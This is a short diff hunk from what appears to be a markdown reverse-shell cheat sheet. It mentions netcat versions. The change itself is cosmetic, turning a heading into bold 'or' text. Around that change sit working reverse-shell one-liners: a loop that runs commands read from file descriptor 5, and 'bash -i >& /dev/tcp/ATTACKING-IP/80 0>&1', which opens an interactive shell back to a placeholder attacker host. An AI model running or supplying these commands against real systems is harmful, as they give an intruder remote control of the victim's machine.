@@ -22,8 +22,8 @@ If you have the wrong version of netcat installed, Jeff Price points out here th
 >
 > cat <&5 | while read line; do $line 2>&5 >&5; done
 >
-### OR
-
+** or **
+>
 > while read line 0<&5; do $line 2>&5 >&5; done
 
 > bash -i >& /dev/tcp/ATTACKING-IP/80 0>&1
